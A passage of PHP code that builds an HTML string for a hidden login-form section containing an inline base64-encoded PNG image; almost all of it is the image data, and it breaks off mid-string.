		$html .= '<section class="login-form text-center animated" style="display: none;">' . "\n\n" . '        <img class="cnsmr-app-image " src="data:image/png;base64,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